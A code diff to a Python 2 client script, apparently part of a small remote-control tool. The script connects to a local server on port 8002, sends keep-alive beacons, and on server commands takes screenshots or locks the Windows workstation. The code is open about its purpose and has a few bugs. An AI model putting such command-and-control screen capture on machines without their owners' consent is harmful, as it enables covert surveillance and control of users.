@@ -6,14 +6,20 @@ from PIL import Image
 import uuid
 import os
 import base64
+import ctypes
 
 global userid
 
-DEBUG = 0
+DEBUG = 1
 
 def log(msg):
 	if DEBUG:
-		log(msg)
+		print msg
+	return
+
+
+def lockscreen_handler():
+	ctypes.windll.user32.LockWorkStation()
 	return
 
 def snap_handler(userid):
@@ -44,21 +50,28 @@ def snap_handler(userid):
 		f.close()
 		os.remove(save_path)
 
-snap_handler(raw_input())
 
-"""
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("127.0.0.1", 8002))
-userid = random.randint(1,10001)
-s.send(str(userid))
-s.recv(1024)
-while True:
-	s.send("KeepAlive!")
-	time.sleep(5)
-	req = s.recv(1024)
-	print 'Do request: ' + req
-	if req == 'hey':
-		hey()
-	elif req == 'nojobs':
-		print 'no jobs for me!'
-"""
+def main():
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect(("127.0.0.1", 8002))
+	log('connected')
+	userid = random.randint(1,10001)
+	log('userid' + str(userid))
+	s.send(str(userid))
+	s.recv(1024)
+	log('before while')
+	while True:
+		s.send("KeepAlive!")
+		log('sleeping')
+		time.sleep(5)
+		req = s.recv(1024)
+		print 'Do request: ' + req
+		if req == 'snap':
+			threading.thread(target=snap_handler, args=(userid,))
+		if req == 'lockscreen':
+			lockscreen_handler()
+		elif req == 'nojobs':
+			print 'no jobs for me!'
+
+if __name__ == '__main__':
+	main()
